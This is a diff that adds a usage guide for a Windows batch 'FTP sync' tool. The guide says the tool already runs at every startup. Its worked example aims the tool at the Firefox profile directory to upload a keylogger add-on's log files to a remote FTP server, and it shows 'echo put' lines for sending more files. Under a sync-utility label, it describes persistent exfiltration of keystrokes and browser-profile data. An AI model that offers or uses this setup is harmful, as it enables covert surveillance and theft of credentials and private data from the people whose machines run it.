@@ -1,0 +1,45 @@
+Instructions To Use:-
+
+not so user friendly
+
+#Mahto's FTPSync is coded using batch programmming under windows 7
+#it will upload any file to your ftp server you provided in your fileup.bat
+#change details in fileup.bat
+FtpUser
+YourPassword
+/directoryToStoreFiles/
+domainname.com
+
+
+now moving forward to start this ftp uploader everytime when u bootup ur system 
+we need to add it on windows startup programs list , i already did this , u don't have to care about this problem anymore
+
+now finally define the directory from where u want to upload ur files to ur ftp server
+#change these details {in eg: i installed an addonin firefox says a keylogger and want to upload its log files to my ftp then cd to log file directory }
+C:
+cd %appdata%
+cd Mozilla/Firefox/Profiles
+cd *.default
+
+
+and upload ur files 
+
+through fileup.bat 
+
+so finally change the code at line 11
+fileup.bat filename1.extension filename2.extension
+
+you can upload two files at any instant
+
+if you want to upload more than two files then add addition lines of code after line 7 in fileup.bat
+echo put %3>> ftpcmd.dat
+echo put %4>> ftpcmd.dat
+
+by doing so you can now upload 4 files at a time
+
+........./
+fb.com/devendermahto
+info@mahtotechnologies.com
+
+
+/.........
